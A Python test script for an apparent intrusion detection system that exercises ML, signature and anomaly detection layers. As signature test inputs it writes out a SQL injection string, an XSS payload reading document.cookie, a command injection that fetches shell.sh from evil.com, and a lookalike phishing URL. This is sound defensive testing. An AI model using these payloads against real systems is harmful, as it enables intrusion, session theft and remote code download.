import sys, warnings
warnings.filterwarnings('ignore')
sys.path.insert(0, '.')

print('Testing Layer 1 - ML Detection...')
from detection.layer1_ml import MLDetectionLayer
from config import MODEL_DIR
layer1 = MLDetectionLayer(
    model_path=str(MODEL_DIR / 'benchmarkids_binary.pkl'),
    feat_cols_path=str(MODEL_DIR / 'benchmarkids_feature_cols.pkl')
)
print('  Layer1 loaded OK')

print()
print('Testing Layer 2 - Signature Detection...')
from detection.layer2_signatures import SignatureDetector
sig = SignatureDetector()

sql_test = sig.check_payload("SELECT * FROM users WHERE id=1 OR 1=1")
assert sql_test['detected'] == True, f'SQL injection not detected: {sql_test}'
assert sql_test['attack_type'] == 'SQLInjection'
print(f'  SQL injection test: DETECTED - {sql_test["attack_type"]}')

xss_test = sig.check_payload('<script>alert(document.cookie)</script>')
assert xss_test['detected'] == True
assert xss_test['attack_type'] == 'XSS'
print(f'  XSS test: DETECTED - {xss_test["attack_type"]}')

cmd_test = sig.check_payload('ping 8.8.8.8; wget http://evil.com/shell.sh')
assert cmd_test['detected'] == True
print(f'  Command injection: DETECTED - {cmd_test["attack_type"]}')

clean_test = sig.check_payload('Hello world this is normal text')
assert clean_test['detected'] == False
print(f'  Clean payload: NOT DETECTED - correct')

phish_test = sig.check_url('http://paypa1.tk/login')
assert phish_test['detected'] == True
print(f'  Phishing URL: DETECTED - {phish_test["attack_type"]}')

print()
print('Testing Layer 3 - Anomaly Detection...')
from detection.layer3_anomaly import AnomalyDetector, BehavioralProfiler, EncryptedTrafficAnalyzer
import pandas as pd, numpy as np

detector = AnomalyDetector(contamination=0.05)
X_normal = pd.DataFrame(np.random.randn(500, 10),
    columns=[f'feature_{i}' for i in range(10)])
detector.fit(X_normal)

X_anomaly = pd.DataFrame(np.random.randn(10, 10) * 10 + 50,
    columns=[f'feature_{i}' for i in range(10)])
results = detector.predict(X_anomaly)
assert results['anomaly_detected'].sum() > 0
print(f'  Anomaly detection: {results["anomaly_detected"].sum()} anomalies in 10 extreme samples')

profiler = BehavioralProfiler()
normal_features = {'pkt_rate': 100, 'bytes_per_sec': 5000, 'unique_ports': 3}
profiler.update_profile('device_001', normal_features)
profiler.update_profile('device_001', normal_features)
profiler.update_profile('device_001', normal_features)

attack_features = {'pkt_rate': 50000, 'bytes_per_sec': 1000000, 'unique_ports': 500}
is_anomalous = profiler.is_anomalous('device_001', attack_features)
assert is_anomalous == True
print(f'  Behavioral profiler: DDoS-like traffic anomalous = {is_anomalous}')

enc = EncryptedTrafficAnalyzer()
enc_result = enc.analyze({'connection_frequency': 100, 'packet_size_variance': 0.001})
assert 'beaconing_detected' in enc_result
print(f'  EncryptedTrafficAnalyzer: beaconing={enc_result["beaconing_detected"]} OK')

print()
print('Phase 4 PASSED - All 3 detection layers operational')
